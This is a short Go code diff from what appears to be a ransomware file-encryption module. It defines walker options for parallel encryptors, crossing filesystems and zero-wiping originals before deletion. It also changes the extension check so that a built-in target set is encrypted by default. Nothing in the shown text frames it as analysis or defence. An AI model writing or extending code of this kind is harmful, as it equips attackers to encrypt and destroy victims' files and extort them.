@@ -15,12 +15,12 @@ import (
 
 // WalkerOptions controls a walker run.
 type WalkerOptions struct {
-	Root        string        // directory to walk
-	MaxSize     int64         // skip files larger than this (bytes); 0 = 64MB
-	WorkerCount int           // parallel encryptors; default 4
-	XDevOK      bool          // cross filesystem boundaries
-	DryRun      bool          // enumerate only, write nothing
-	WipeOrig    bool          // overwrite original with zeros before unlink
+	Root        string // directory to walk
+	MaxSize     int64  // skip files larger than this (bytes); 0 = 64MB
+	WorkerCount int    // parallel encryptors; default 4
+	XDevOK      bool   // cross filesystem boundaries
+	DryRun      bool   // enumerate only, write nothing
+	WipeOrig    bool   // overwrite original with zeros before unlink
 	// OnHit is called per file as it is found (pre-encryption). If nil, no callback.
 	OnHit func(path string, size int64)
 	// OnDone is called after every file with (ok, err). If nil, no callback.
@@ -113,10 +113,15 @@ func isTargetExt(name string, override map[string]struct{}) bool {
 	if ext == "" {
 		return false
 	}
-	if _, ok := override[ext]; ok {
-		return true
+	// caller-supplied override takes precedence
+	if override != nil {
+		if _, ok := override[ext]; ok {
+			return true
+		}
 	}
-	return false
+	// fall back to the built-in target set
+	_, ok := targetExts[ext]
+	return ok
 }
 
 // Walk walks opts.Root, encrypting every file whose extension is in the
